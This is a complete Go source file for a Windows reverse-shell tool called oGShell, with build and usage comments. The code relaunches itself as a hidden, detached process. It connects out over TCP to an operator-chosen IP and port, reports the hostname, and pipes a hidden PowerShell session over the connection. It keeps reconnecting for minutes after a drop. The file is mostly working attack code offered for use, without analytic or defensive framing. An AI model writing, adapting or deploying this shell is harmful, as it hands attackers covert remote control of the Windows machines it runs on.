//go:build windows

/*
To build, edit the serverIp and serverPort variable, if wanted, and use the following command:
GOOS=windows GOARCH=amd64 go build -o oGShell.exe cmd/windows/main.go
run with
oGShell.exe <serverIP> <serverPort>
*/
package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

/*
Global Variables to possibly change

		Useful if you want to run the program in memory or don't have a terminal
	Change the server IP and server port if you would like to hardcode them
		Useful if you accidentally hit control C and end the process, now you can reconnect by just restarting the listener
	Change the retry duration to set how long the program will continue running once the connection has dropped
	Change the retry interval to set how often the program will attempt to reconnect during the retry duration
*/
var serverIP = ""
var serverPort = ""
var retryDuration = 5 * time.Minute
var retryInterval = 10 * time.Second

const CREATE_NEW_PROCESS_GROUP = 0x00000200

func relaunchDetached(serverIP, serverPort string) {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command(exe, "-detached", serverIP, serverPort)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: CREATE_NEW_PROCESS_GROUP | 0x00000008,
		HideWindow:    true,
	}
	cmd.Start()
}

func tryConnect(serverIP, serverPort string) bool {
	address := net.JoinHostPort(serverIP, serverPort)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return false
	}

	hostname, _ := os.Hostname()
	conn.Write([]byte("Connected to host: " + hostname + "\n"))

	cmd := exec.Command("powershell.exe", "-NoExit", "-NoLogo")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NEW_PROCESS_GROUP,
	}

	if err := cmd.Start(); err != nil {
		conn.Close()
		return false
	}

	cmd.Wait()
	conn.Close()
	return true
}

func printHelp() {
	fmt.Println("Usage: oGShell.exe <serverIP> <serverPort>")
	fmt.Println("")
	fmt.Println("If you want to hardcode the IP and Port, set the serverIP and serverPort variables before building.")
	os.Exit(1)
}

func timedRead(prompt, defaultVal string, timeout time.Duration) string {
	fmt.Printf("%s ", prompt)

	ch := make(chan string, 1)
	go func() {
		var input string
		fmt.Scanln(&input)
		input = strings.TrimSpace(input)
		ch <- input
	}()

	select {
	case input := <-ch:
		if input == "" {
			return defaultVal
		}
		return input
	case <-time.After(timeout):
		fmt.Println("\nTimed out, using default:", defaultVal)
		return defaultVal
	}
}

func getConnectionDetails(defaultIP, defaultPort string, timeout time.Duration) (string, string) {
	fmt.Printf("Enter IP and Port or wait %.0f seconds to use defaults (%s:%s):\n",
		timeout.Seconds(), defaultIP, defaultPort)
	fmt.Println("Press Enter without typing anything to use defaults.")

	ip := timedRead("IP:", defaultIP, timeout)
	if ip == defaultIP {
		return defaultIP, defaultPort
	}
	port := timedRead("Port:", defaultPort, timeout)
	return ip, port
}

func main() {
	detached := flag.Bool("detached", false, "Running as detached process")
	flag.Parse()

	args := flag.Args()

	switch len(args) {
	case 2:
		serverIP = args[0]
		serverPort = args[1]
		if net.ParseIP(serverIP) == nil {
			fmt.Printf("Invalid IP address: %s\n", serverIP)
			if serverIP != "" && serverPort != "" {
				fmt.Printf("Hardcoded IP and port is %s:%s\n", serverIP, serverPort)
				if strings.ToLower(timedRead("Would you like to continue with this host? (Y/N):", "n", 15*time.Second)) == "n" {
					fmt.Println("Quitting.")
					printHelp()
				}
			}
		} else {
			break
		}
		fallthrough
	case 0:
		serverIP, serverPort = getConnectionDetails(serverIP, serverPort, 30*time.Second)
		fmt.Printf("Attempting to use IP and Port: %s:%s\n", serverIP, serverPort)
		if serverIP == "" && serverPort == "" {
			fmt.Println("IP and Port are null, quitting.")
			printHelp()
		}
	default:
		printHelp()
	}

	if !*detached {
		relaunchDetached(serverIP, serverPort)
		return
	}

	deadline := time.Now().Add(retryDuration)

	for time.Now().Before(deadline) {
		if tryConnect(serverIP, serverPort) {
			deadline = time.Now().Add(retryDuration)
		}
		if time.Now().Before(deadline) {
			time.Sleep(retryInterval)
		}
	}
}
